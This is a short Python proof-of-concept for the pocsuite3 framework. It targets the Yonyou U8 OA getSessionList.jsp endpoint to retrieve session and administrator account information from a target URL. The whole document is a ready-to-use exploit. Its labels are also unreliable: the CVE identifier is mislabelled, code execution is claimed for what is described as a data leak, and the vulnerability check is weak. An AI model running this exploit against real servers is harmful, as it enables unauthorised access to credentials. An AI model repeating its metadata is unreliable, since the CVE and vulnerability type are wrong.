from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
class DemoPOC(POCBase):
    vulID = 'CVE-2020-17519'  # ssvid
    version = '1.0'
    name = '用友 U8 OA'
    appName = '用友'
    appVersion = '3.0.1'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
            r = requests.get(url=target,timeout=10,verify=False)
            if r.status_code == 200 and "1" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['payload'] = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
                return self.parse_output(result)
        except:
            return
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)